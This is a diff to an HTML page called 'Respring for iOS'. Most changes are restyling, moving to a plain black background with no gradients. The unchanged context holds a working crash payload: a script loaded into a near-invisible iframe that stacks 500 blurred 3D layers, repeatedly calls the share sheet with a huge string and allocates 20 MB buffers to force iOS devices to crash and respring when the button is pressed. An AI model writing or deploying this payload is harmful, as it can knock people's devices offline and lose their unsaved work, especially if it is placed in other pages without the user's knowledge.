@@ -3,18 +3,17 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-  <meta name="theme-color" content="#151617">
+  <meta name="theme-color" content="#000000">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="description" content="Respring for iOS">
   <meta name="apple-mobile-web-app-title" content="Respring">
   <title>Respring</title>
-  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%23151617'/%3E%3Cg fill='none' stroke='%23d4d8dc' stroke-width='5' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M50 12v12H38'/%3E%3Cpath d='M49 38a18 18 0 1 1-4-19l5 5'/%3E%3C/g%3E%3C/svg%3E">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%23000000'/%3E%3Cg fill='none' stroke='%23d4d8dc' stroke-width='5' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M50 12v12H38'/%3E%3Cpath d='M49 38a18 18 0 1 1-4-19l5 5'/%3E%3C/g%3E%3C/svg%3E">
   <style>
-    :root{color-scheme:dark;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;color:#fff;background:#151617;font-synthesis:none;--muted:rgba(228,231,234,.52);--accent:#d4d8dc}
+    :root{color-scheme:dark;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;color:#fff;background:#000;font-synthesis:none;--muted:rgba(228,231,234,.52);--accent:#d4d8dc}
     *{box-sizing:border-box}
-    body{margin:0;min-height:100svh;background:radial-gradient(ellipse at 4% 45%,#42464b 0,transparent 51%),radial-gradient(ellipse at 88% 98%,#303438 0,transparent 56%),radial-gradient(ellipse at 55% 4%,#17191b 0,transparent 68%),#151617;background-attachment:fixed}
-    body:before{content:"";position:fixed;inset:0;pointer-events:none;background:radial-gradient(ellipse at 15% 58%,#ffffff14,transparent 50%);animation:ambient 18s ease-in-out infinite alternate}
+    body{margin:0;min-height:100svh;background:#000}
     button{-webkit-tap-highlight-color:transparent;font:inherit;color:inherit;cursor:pointer;border:0;touch-action:manipulation}
     button:disabled{cursor:default}
     button:focus-visible{outline:2px solid #fff;outline-offset:5px}
@@ -32,9 +31,7 @@
     .crash-frame{position:fixed;top:0;left:0;width:1px;height:1px;border:0;opacity:.05;pointer-events:none}
     [hidden]{display:none!important}
     @keyframes spin{to{transform:rotate(360deg)}}
-    @keyframes ambient{to{transform:translateY(-5%) scale(1.1);opacity:.5}}
-    @media(min-width:700px){body{background:radial-gradient(ellipse at 24% 48%,#393d41 0,transparent 55%),radial-gradient(ellipse at 82% 100%,#2c2f33 0,transparent 60%),#111213}}
-    @media(prefers-reduced-motion:reduce){body:before{animation:none}*{transition:none!important}}
+    @media(prefers-reduced-motion:reduce){*{transition:none!important}}
   </style>
 </head>
 <body>
@@ -49,7 +46,6 @@
   <script>
     'use strict';
     const $ = id => document.getElementById(id);
-
     const KEY = 'califeine-resprung';
     const HASH = '#resprung';
     function cookieValue(name) {
@@ -84,7 +80,6 @@
       try { if (window.name === KEY) window.name = ''; } catch {}
       try { if (location.hash === HASH) history.replaceState(null, '', location.pathname + location.search); } catch {}
     }
-
     function detectDevice(ua, platform, touches) {
       const ipad = /iPad/.test(ua) || (/Mac/.test(platform) && touches > 1);
       const ios = ipad || /iPhone|iPod/.test(ua);
@@ -96,7 +91,6 @@
       return {device: system === 'Android' ? 'Android device' : 'Non-iOS device', system, version: 'Unavailable', ios: false};
     }
     const device = detectDevice(navigator.userAgent, navigator.platform, navigator.maxTouchPoints || 0);
-
     const btn = $('respring');
     const label = btn.querySelector('.label');
     const icon = btn.querySelector('.icon');
@@ -110,7 +104,6 @@
       label.textContent = state === 'running' ? 'Respringing\u2026' : state === 'done' ? 'Resprung' : 'Respring';
       btn.disabled = state === 'running' || !device.ios;
     }
-
     const CRASH_SCRIPT = `<!doctype html>
 <html>
 <body style="margin:0;overflow:hidden">
@@ -118,13 +111,11 @@
 const container = document.createElement('div');
 container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
 document.body.appendChild(container);
-
 for (let i = 0; i < 500; i++) {
   const layer = document.createElement('div');
   layer.style.cssText = 'position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);opacity:0.99;';
   container.appendChild(layer);
 }
-
 setInterval(() => {
   try { navigator.share({title:'R', text:'R'.repeat(100000)}); } catch (e) {}
   const block = new Uint8Array(1024 * 1024 * 20);
@@ -133,7 +124,6 @@ setInterval(() => {
 <\/script>
 </body>
 </html>`;
-
     function triggerRespringCrash() {
       if (!device.ios || $('respring-crash')) return;
       const frame = document.createElement('iframe');
@@ -145,11 +135,9 @@ setInterval(() => {
       frame.srcdoc = CRASH_SCRIPT;
       document.body.append(frame);
     }
-
     let active = false;
     let fallbackTimer;
     let doneTimer;
-
     function resetRun() {
       active = false;
       clearTimeout(fallbackTimer);
@@ -158,7 +146,6 @@ setInterval(() => {
       clearFlag();
       setState('idle');
     }
-
     if (!device.ios) {
       setState('idle');
       $('hint').hidden = false;
@@ -167,17 +154,15 @@ setInterval(() => {
       setState('done');
       doneTimer = setTimeout(() => { clearFlag(); setState('idle'); }, 2200);
     }
-
     btn.addEventListener('click', () => {
       if (!device.ios || active) return;
       clearTimeout(doneTimer);
       active = true;
       writeFlag();
       setState('running');
-      setTimeout(triggerRespringCrash, 700);  
+      setTimeout(triggerRespringCrash, 700);
       fallbackTimer = setTimeout(resetRun, 15000);
     });
-
     addEventListener('pagehide', () => { if (active) writeFlag(false); });
     addEventListener('visibilitychange', () => {
       if (document.visibilityState === 'hidden' && active) writeFlag(false);
